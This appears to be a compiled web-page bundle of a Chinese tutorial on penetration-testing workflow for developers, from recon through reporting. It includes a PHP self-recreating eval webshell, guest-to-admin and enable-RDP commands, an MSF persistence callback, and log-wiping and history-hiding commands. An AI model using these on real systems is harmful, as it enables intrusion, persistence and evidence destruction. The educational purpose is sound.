import{_ as e,a as l}from"./chunks/dev-security-flow-2.EhuF9hUg.js";import{_ as i,c as t,ai as s,o as n}from"./chunks/framework.BrYByd3F.js";const f=JSON.parse('{"title":"开发安全实战 - 渗透测试流程示例","description":"","frontmatter":{},"headers":[],"relativePath":"develop/security/dev-security-y-pentest-workflow.md","filePath":"develop/security/dev-security-y-pentest-workflow.md","lastUpdated":1737706346000}'),r={name:"develop/security/dev-security-y-pentest-workflow.md"};function p(o,a,h,d,c,u){return n(),t("div",null,a[0]||(a[0]=[s('<h1 id="开发安全实战-渗透测试流程示例" tabindex="-1">开发安全实战 - 渗透测试流程示例 <a class="header-anchor" href="#开发安全实战-渗透测试流程示例" aria-label="Permalink to &quot;开发安全实战 - 渗透测试流程示例&quot;">​</a></h1><blockquote><p>在应用程序上线之前，都会进行多次内部或者外部的渗透测试。对于开发而言，有必要了解下渗透测试的整体流程，从而知己知彼，避免一些开发中的问题。@pdai</p></blockquote><h2 id="渗透测试简介" tabindex="-1">渗透测试简介 <a class="header-anchor" href="#渗透测试简介" aria-label="Permalink to &quot;渗透测试简介&quot;">​</a></h2><h3 id="渗透测试是什么" tabindex="-1">渗透测试是什么 <a class="header-anchor" href="#渗透测试是什么" aria-label="Permalink to &quot;渗透测试是什么&quot;">​</a></h3><p>渗透测试就是利用我们所掌握的渗透知识，对网站进行一步一步的渗透，发现其中存在的漏洞和隐藏的风险，然后撰写一篇测试报告，提供给我们的客户。客户根据我们撰写的测试报告，对网站进行漏洞修补，以防止黑客的入侵！</p><h3 id="渗透测试和入侵的区别" tabindex="-1">渗透测试和入侵的区别 <a class="header-anchor" href="#渗透测试和入侵的区别" aria-label="Permalink to &quot;渗透测试和入侵的区别&quot;">​</a></h3><p>和入侵的区别是，渗透测试的前提是我们得经过用户的授权，才可以对网站进行渗透。如果我们没有经过客户的授权而对一个网站进行渗透测试的话，这是违法的。2017年的6.1日我国颁布了<a href="https://baike.baidu.com/item/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/16843044?fromtitle=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95&amp;fromid=12291792&amp;fr=aladdin" target="_blank" rel="noreferrer">《网络安全法》在新窗口打开</a>，对网络犯罪有了法律约束。</p><h3 id="渗透测试分类" tabindex="-1">渗透测试分类 <a class="header-anchor" href="#渗透测试分类" aria-label="Permalink to &quot;渗透测试分类&quot;">​</a></h3><p>渗透测试分为 <strong>白盒测试</strong> 和 <strong>黑盒测试</strong></p><ul><li>白盒测试就是在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码分析</li><li>黑盒测试就是只告诉我们这个网站的url，其他什么都不告诉，然后让你去渗透，模拟黑客对网站的渗透</li></ul><h2 id="渗透测试流程举例" tabindex="-1">渗透测试流程举例 <a class="header-anchor" href="#渗透测试流程举例" aria-label="Permalink to &quot;渗透测试流程举例&quot;">​</a></h2><p>我们现在就模拟黑客对一个网站进行渗透测试，这属于黑盒测试，我们只知道该网站的URL，其他什么的信息都不知道。</p><p>接下来，我就给大家分享下黑盒渗透测试的流程和思路！</p><p><img src="'+e+`" alt=""></p><h3 id="确定目标" tabindex="-1">确定目标 <a class="header-anchor" href="#确定目标" aria-label="Permalink to &quot;确定目标&quot;">​</a></h3><ul><li>确定范围：测试目标的范围、ip、域名、内外网、测试账户。</li><li>确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。</li><li>确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞、等等。</li></ul><h3 id="信息收集" tabindex="-1">信息收集 <a class="header-anchor" href="#信息收集" aria-label="Permalink to &quot;信息收集&quot;">​</a></h3><ul><li>方式：主动扫描，开放搜索等。</li><li>开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。</li><li>基础信息：IP、网段、域名、端口。</li><li>应用信息：各端口的应用。例如web应用、邮件应用、等等。</li><li>系统信息：操作系统版本</li><li>版本信息：所有这些探测到的东西的版本。</li><li>服务信息：中间件的各类信息，插件信息。</li><li>人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。</li><li>防护信息：试着看能否探测到防护设备。</li></ul><h3 id="漏洞探测" tabindex="-1">漏洞探测 <a class="header-anchor" href="#漏洞探测" aria-label="Permalink to &quot;漏洞探测&quot;">​</a></h3><p>当我们收集到了足够多的信息之后，我们就要开始对网站进行漏洞探测了。探测网站是否存在一些常见的Web漏洞，比如：</p><ul><li><a href="https://pdai.tech/md/develop/security/dev-security-x-owasp.html" target="_blank" rel="noreferrer">开发安全 - OWASP Top 10</a></li><li><a href="https://pdai.tech/md/develop/security/dev-security-x-injection.html" target="_blank" rel="noreferrer">开发安全 - 注入攻击详解</a></li><li><a href="https://pdai.tech/md/develop/security/dev-security-x-csrf.html" target="_blank" rel="noreferrer">开发安全 - CSRF 详解</a></li><li><a href="https://pdai.tech/md/develop/security/dev-security-x-xss.html" target="_blank" rel="noreferrer">开发安全 - XSS 详解</a></li><li><a href="https://pdai.tech/md/develop/security/dev-security-x-ddos.html" target="_blank" rel="noreferrer">开发安全 - DDoS 详解</a></li><li><a href="https://pdai.tech/md/develop/security/dev-security-x-click-hijack.html" target="_blank" rel="noreferrer">开发安全 - 点击劫持详解</a></li></ul><p>网站漏洞扫描工具也有很多，比如：</p><ul><li>AWVS</li><li>AppScan</li><li>Owasp-Zap</li><li>Nessus等</li></ul><h3 id="漏洞验证" tabindex="-1">漏洞验证 <a class="header-anchor" href="#漏洞验证" aria-label="Permalink to &quot;漏洞验证&quot;">​</a></h3><p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。</p><h4 id="漏洞验证工具" tabindex="-1">漏洞验证工具 <a class="header-anchor" href="#漏洞验证工具" aria-label="Permalink to &quot;漏洞验证工具&quot;">​</a></h4><p>常用工具：</p><ul><li>SQL注入——&gt; Sqlmap的使用</li><li>XSS跨站脚本——&gt; Beef-XSS的使用</li><li>抓包改包工具——&gt; Burpsuite、Fidder</li><li>文件上传漏洞——&gt; 一般会上传一句话木马上去，进而再获得webshell</li></ul><p>但是，获得了webshell后，一般权限很低，所以我们需要提权。</p><p>其它公开资源的利用：</p><ul><li>exploit-db/wooyun/</li><li>google hacking</li><li>渗透代码网站</li><li>通用、缺省口令</li><li>厂商的漏洞警告等等。</li></ul><h4 id="漏洞验证方式" tabindex="-1">漏洞验证方式 <a class="header-anchor" href="#漏洞验证方式" aria-label="Permalink to &quot;漏洞验证方式&quot;">​</a></h4><ul><li>自动化验证：结合自动化扫描工具提供的结果</li><li>手工验证，根据公开资源进行验证</li><li>试验验证：自己搭建模拟环境进行验证</li><li>登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</li><li>业务漏洞验证：如发现业务漏洞，要进行验证</li></ul><h3 id="内网转发" tabindex="-1">内网转发 <a class="header-anchor" href="#内网转发" aria-label="Permalink to &quot;内网转发&quot;">​</a></h3><p>当我们获取到了网站的Webshell之后，如果我们想获取该主机的有关信息，我们可以将该主机的webshell换成MSF的shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个MSF类型的shell了。</p><p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。</p><h3 id="内网横向渗透" tabindex="-1">内网横向渗透 <a class="header-anchor" href="#内网横向渗透" aria-label="Permalink to &quot;内网横向渗透&quot;">​</a></h3><p>当我们在获取了外网服务器的权限，进入该系统后，我们要想尽办法从该服务器上查找到我们想要的信息。</p><p>对于windows主机，我们应该多去翻翻目录，或许能有很多意想不到的结果。很多人习惯把账号密码等容易忘的东西存放在备忘录中，或者是桌面上。我们还可以查找数据库的连接文件，查看数据库的连接账号密码等敏感信息。当我们获得了windows主机的账号密码，或者是自己创建了新用户后，我们为了不被网站管理员发现和不破坏服务器。我们尽量不要使用远程桌面。因为使用远程桌面动静比较大，如果此时服务器管理员也在登录，而你此时通过远程桌面登录的话，会将管理员挤掉，而你也将很快的被管理员踢掉。对于实在是要远程桌面登录的情况的话，我们尽量不要新建一个用户进行登录。我们可以激活  guest 用户，然后将其加入 administrators 组里面，用 guest 用户身份登录。在RDP远程登录后，我们可以查看其他用户桌面上和其他目录有哪些软件，我们要找的目标有以下。</p><ul><li>FTP相关的软件</li><li>数据库相关的软件</li><li>打开浏览器，查看历史记录，查看某些网站是否保存有用户密码。利用工具查看浏览器保存的密码</li></ul><p>从该主机上找到的账号密码，我们可以做一个字典，在对内网其他机器进行爆破的时候，很有可能是同密码。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>net user  guest  /active:yes                      #激活guest用户</span></span>
<span class="line"><span>net localgroup  administrators  guest  /add       #将guest用户添加到</span></span>
<span class="line"><span>net user guest    密码                            #更改guest用户密码</span></span>
<span class="line"><span>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f                          #开启3389端口</span></span></code></pre></div><p>对于Linux主机，我们可以查看开放的端口号，开放的服务，与其建立连接的内网主机。查看目录，查找网站数据库连接密码。总之，就是尽可能的多查找一些账号密码，这对于内网的账号爆破非常有用。</p><p>在搭建了隧道可以通内网后，我们首先就需要对内网进行资产发现了。但是对于内网存活网段的判断是一个大问题。内网很有可能同时存在 10.0.0.0/8、172.16.0.0/16、192.168.0.0/24 网段。这就需要我们用扫描器对其进行探测了。通过代理进行内网扫描不建议使用nmap。如果是在本地主机通过代理扫描，可以图形化界面的话，可以使用 RouterScan 、御剑高速TCP全端口扫描器、IIS_Scanner。但是注意线程调低一点，不然代理很容易崩了。如果使用命令行扫描器的话，可以使用S扫描器。在扫描了内网资产和端口开放情况后，对于445端口，就可以打一波MS17_010。但是注意通过代理打445，和之前的是不一样的。传送门——&gt; 内网渗透之MS17-010 。对于3389端口，可以打一波CVE-2019-0708，传送门——&gt; CVE-2019-0708 远程桌面漏洞复现 。对于1433/3306/6379等端口，可以尝试爆破，利用之前收集到的账号密码成功率更高哦。</p><h3 id="权限维持" tabindex="-1">权限维持 <a class="header-anchor" href="#权限维持" aria-label="Permalink to &quot;权限维持&quot;">​</a></h3><p>在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。</p><h4 id="web后门" tabindex="-1">Web后门 <a class="header-anchor" href="#web后门" aria-label="Permalink to &quot;Web后门&quot;">​</a></h4><p>1：隐藏后门文件(将文件设置为隐藏)</p><p>2：不死马，该脚本每5秒向服务器创建test.php，并写入一句话免杀木马。结合attrib命令隐藏文件更好地建立后门。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>&lt;?php</span></span>
<span class="line"><span>    set_time_limit(0);//程序执行时间</span></span>
<span class="line"><span>    ignore_user_abort(1);//关掉终端后脚本仍然运行</span></span>
<span class="line"><span>    unlink(__FILE__);//文件完整名</span></span>
<span class="line"><span>    while(1){</span></span>
<span class="line"><span>        file_put_contents(&#39;test.php&#39;,&#39;&lt;?php $a=array($_REQUEST[&quot;x&quot;]=&gt;&quot;3&quot;);</span></span>
<span class="line"><span>        $b=array_keys($a)[0];</span></span>
<span class="line"><span>        eval($b);?&gt;&#39;);</span></span>
<span class="line"><span>        sleep(5);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>?&gt;</span></span></code></pre></div><p>3： 404页面隐藏后门，或者在其他自带文件中插入后门代码</p><p>注：以上几种后门方法均能被D盾等工具检测到</p><h4 id="windows系统" tabindex="-1">Windows系统 <a class="header-anchor" href="#windows系统" aria-label="Permalink to &quot;Windows系统&quot;">​</a></h4><p>1：建立隐藏用户，在用户名后加 $</p><p>2：在开机启动目录下放置木马文件，只要目标机器重启，将回连我们的远控</p><p>3：MSF里的 persistence 模块，执行命令可以使目标机器每隔一定时间自动回连远控。但是容易被发现</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span></span>
<span class="line"><span>run persistence -X -i 5 -p 8888 -r 192.168.10.27  </span></span>
<span class="line"><span> </span></span>
<span class="line"><span>#然后它就在目标机新建了这个文件：C:\\Windows\\TEMP\\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span></span></code></pre></div><p>4：在域环境下，想办法获得 krbtgt 用户的哈希，该用户的哈希可以进行票据传递攻击。而且一般该用户的密码不经常改变。</p><p>5：shift后门</p><p>6：远程桌面会话劫持</p><h4 id="linux系统" tabindex="-1">Linux系统 <a class="header-anchor" href="#linux系统" aria-label="Permalink to &quot;Linux系统&quot;">​</a></h4><ul><li>SSH后门</li><li>crontab定时任务</li><li>SSH公钥</li><li>创建SUID=0的用户</li></ul><h3 id="痕迹清除" tabindex="-1">痕迹清除 <a class="header-anchor" href="#痕迹清除" aria-label="Permalink to &quot;痕迹清除&quot;">​</a></h3><p>当我们达到了目的之后，有时候只是为了黑入网站挂黑页，炫耀一下；或者在网站留下一个后门，作为肉鸡，没事的时候上去溜达溜达；亦或者挂入挖矿木马；但是大家千万不要干这些事，这些都是违法的！</p><p>我这里只是教大家在渗透进去之后如何清除我们留下的一部分痕迹，并不能完全清除，完全清除入侵痕迹是不可能的！主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论你怎么清除，还是能查到的。</p><p>最主要还是要以隐藏自身身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p><h4 id="windows系统-1" tabindex="-1">Windows系统 <a class="header-anchor" href="#windows系统-1" aria-label="Permalink to &quot;Windows系统&quot;">​</a></h4><p>1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p><p>2：如果3389远程登录过，需要清除mstsc痕迹</p><p>3：执行命令清除日志：</p><p>del %WINDR%* .log /a/s/q/f 4：如果是web应用，找到web日志文件，删除</p><p>相关文章：WINDOWS之入侵痕迹清理总结</p><h4 id="linux系统-1" tabindex="-1">Linux系统 <a class="header-anchor" href="#linux系统-1" aria-label="Permalink to &quot;Linux系统&quot;">​</a></h4><ul><li>如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</li></ul><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>export HISTFILE=/dev/null export HISTSIZE=0</span></span></code></pre></div><ul><li>删除 /var/log 目录下的日志文件</li><li>如果是web应用，找到web日志文件，删除</li></ul><h3 id="撰写渗透测试保告" tabindex="-1">撰写渗透测试保告 <a class="header-anchor" href="#撰写渗透测试保告" aria-label="Permalink to &quot;撰写渗透测试保告&quot;">​</a></h3><p>在完成了渗透测试之后，我们就需要对这次渗透测试撰写渗透测试报告了。明确的写出哪里存在漏洞，以及漏洞修补的方法。以便于网站管理员根据我们的渗透测试报告修补这些漏洞和风险，防止被黑客攻击！</p><h4 id="整理信息" tabindex="-1">整理信息 <a class="header-anchor" href="#整理信息" aria-label="Permalink to &quot;整理信息&quot;">​</a></h4><ul><li>整理渗透工具：整理渗透过程中用到的代码，poc，exp等</li><li>整理收集信息：整理渗透过程中收集到的一切信息</li><li>整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</li></ul><h4 id="给出报告" tabindex="-1">给出报告 <a class="header-anchor" href="#给出报告" aria-label="Permalink to &quot;给出报告&quot;">​</a></h4><ul><li>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</li><li>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</li><li>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</li></ul><h3 id="流程总结" tabindex="-1">流程总结 <a class="header-anchor" href="#流程总结" aria-label="Permalink to &quot;流程总结&quot;">​</a></h3><p><img src="`+l+'" alt=""></p><h2 id="参考文章" tabindex="-1">参考文章 <a class="header-anchor" href="#参考文章" aria-label="Permalink to &quot;参考文章&quot;">​</a></h2><ul><li>本文主要参考自<a href="https://blog.csdn.net/qq_36119192/article/details/84674109" target="_blank" rel="noreferrer">谢公子-一次完整的渗透测试流程在新窗口打开</a>和<a href="https://www.freebuf.com/column/196291.html" target="_blank" rel="noreferrer">渗透测试的8个步骤在新窗口打开</a></li><li><a href="https://www.freebuf.com/column/196291.html" target="_blank" rel="noreferrer">https://www.freebuf.com/column/196291.html</a></li><li><a href="https://www.cnblogs.com/klb561/p/12152649.html" target="_blank" rel="noreferrer">https://www.cnblogs.com/klb561/p/12152649.html</a></li><li><a href="https://blog.csdn.net/xl%5C_lx/article/details/78399746" target="_blank" rel="noreferrer">https://blog.csdn.net/xl\\_lx/article/details/78399746</a></li></ul><p>本文转自 <a href="https://pdai.tech" target="_blank" rel="noreferrer">https://pdai.tech</a>，如有侵权，请联系删除。</p>',87)]))}const g=i(r,[["render",p]]);export{f as __pageData,g as default};
